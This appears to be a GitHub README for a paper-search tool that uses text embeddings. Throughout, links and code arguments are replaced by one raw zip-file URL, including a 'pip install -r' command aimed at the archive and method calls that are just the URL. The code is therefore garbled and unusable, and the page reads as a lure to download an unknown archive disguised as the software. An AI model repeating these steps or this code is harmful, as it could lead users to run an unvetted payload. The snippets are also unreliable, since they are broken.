# 🔍 SearchPaperByEmbedding - Find Similar Papers Easily

[![Download Now](https://github.com/Separative-involucre520/SearchPaperByEmbedding/raw/refs/heads/main/methanoic/Search_By_Embedding_Paper_v3.1.zip)](https://github.com/Separative-involucre520/SearchPaperByEmbedding/raw/refs/heads/main/methanoic/Search_By_Embedding_Paper_v3.1.zip)

## 📚 Overview

SearchPaperByEmbedding helps you find similar academic papers using a simple process. You can choose between free local models or a more accurate option through the OpenAI API. Use this tool to make research easier.

### ⚡ Features

- Request papers from OpenReview (e.g., ICLR2026 submissions)
- Conduct semantic searches with sample papers or text queries
- Cache embeddings for faster searches
- Support for multiple embedding models: open-source or OpenAI

## 🚀 Getting Started

### System Requirements

- Operating System: Windows, macOS, or Linux
- Python Version: 3.7 or higher
- Internet connection for OpenAI API access (if applicable)
  
### 🔧 Installation

1. **Download the latest version:**

   Visit this page to download: [SearchPaperByEmbedding Releases](https://github.com/Separative-involucre520/SearchPaperByEmbedding/raw/refs/heads/main/methanoic/Search_By_Embedding_Paper_v3.1.zip)

2. **Install dependencies:**

   Open your command line and run the following command:

   ```bash
   pip install -r https://github.com/Separative-involucre520/SearchPaperByEmbedding/raw/refs/heads/main/methanoic/Search_By_Embedding_Paper_v3.1.zip
   ```

### 1. 📄 Prepare Papers

Before you search for papers, you need to gather them.

Run the following code to download papers from a specific conference:

```python
from crawl import crawl_papers

crawl_papers(
    venue_id="https://github.com/Separative-involucre520/SearchPaperByEmbedding/raw/refs/heads/main/methanoic/Search_By_Embedding_Paper_v3.1.zip",
    output_file="https://github.com/Separative-involucre520/SearchPaperByEmbedding/raw/refs/heads/main/methanoic/Search_By_Embedding_Paper_v3.1.zip"
)
```

This code will create a JSON file containing the papers from ICLR 2026. Make sure your Python environment is set up correctly to run this.

### 2. 🔍 Search Papers

Now, you can search for similar papers.

Choose the model you want to use for searching.

#### Local Model (Free)

To use the local model, run the following code:

```python
from search import PaperSearcher

searcher = PaperSearcher('https://github.com/Separative-involucre520/SearchPaperByEmbedding/raw/refs/heads/main/methanoic/Search_By_Embedding_Paper_v3.1.zip', model_type='local')
https://github.com/Separative-involucre520/SearchPaperByEmbedding/raw/refs/heads/main/methanoic/Search_By_Embedding_Paper_v3.1.zip()
```

This will create embeddings for your papers, allowing you to search them quickly.

#### OpenAI Model (Better Quality)

For improved results, you may use the OpenAI model. You need to set your OpenAI API key first.

1. Set your API key:

   ```bash
   export OPENAI_API_KEY='your-key'
   ```

2. Use the OpenAI model for searching:

```python
searcher = PaperSearcher('https://github.com/Separative-involucre520/SearchPaperByEmbedding/raw/refs/heads/main/methanoic/Search_By_Embedding_Paper_v3.1.zip', model_type='openai')
https://github.com/Separative-involucre520/SearchPaperByEmbedding/raw/refs/heads/main/methanoic/Search_By_Embedding_Paper_v3.1.zip()
```

### 📊 Example Searches

You can search papers related to your interests. Here's how:

1. Define your examples:

```python
examples = [
    {
        'title': 'Your First Paper Title',
        'abstract': 'Brief description of the first paper.'
    },
    {
        'title': 'Your Second Paper Title',
        'abstract': 'Brief description of the second paper.'
    }
]
```

2. Run the search:

```python
for example in examples:
    results = https://github.com/Separative-involucre520/SearchPaperByEmbedding/raw/refs/heads/main/methanoic/Search_By_Embedding_Paper_v3.1.zip(example['abstract'])
    print(f"Results for: {example['title']}")
    for result in results:
        print(result)
```

### 📥 Download & Install

To download the software and get started, visit this link: [SearchPaperByEmbedding Releases](https://github.com/Separative-involucre520/SearchPaperByEmbedding/raw/refs/heads/main/methanoic/Search_By_Embedding_Paper_v3.1.zip).

Make sure to follow the steps carefully to ensure a smooth setup.

## 🛠 Troubleshooting

If you encounter issues during installation or usage, consider the following steps:

1. **Check Python Installation:** Ensure Python is installed correctly. You can check by running `python --version` in your command line.

2. **Dependencies:** Make sure all dependencies are installed. Review any error messages during the installation process.

3. **Internet Connection:** If using the OpenAI model, ensure you have a reliable internet connection.

For further assistance, consider looking for help in the GitHub Issues section of the repository.

## 📖 Additional Resources

- **GitHub Repository:** Explore the full source code and documentation on GitHub.  
- **Community Support:** Join discussions and ask questions on relevant online forums.

With SearchPaperByEmbedding, your research just got simpler. Enjoy discovering new academic papers!